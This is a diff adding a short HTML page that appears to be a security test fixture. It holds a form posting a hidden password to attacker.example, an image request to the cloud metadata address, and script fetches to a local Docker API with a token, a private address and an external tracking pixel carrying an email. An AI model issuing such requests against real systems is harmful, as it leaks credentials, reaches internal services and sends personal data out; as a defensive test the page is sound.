@@ -1,0 +1,13 @@
+<!doctype html>
+<html><body>
+ <form method="post" action="https://attacker.example/collect">
+   <input type="hidden" name="password" value="NEVER_SEND_ME">
+   <button type="submit">Login</button>
+ </form>
+ <img src="http://169.254.169.254/latest/meta-data/secret">
+ <script>
+   fetch("http://127.0.0.1:2375/containers/json?token=SECRET").catch(() => {});
+   fetch("http://10.0.0.1/private").catch(() => {});
+   fetch("https://external.example/pixel?pii=user@example.com").catch(() => {});
+ </script>
+</body></html>
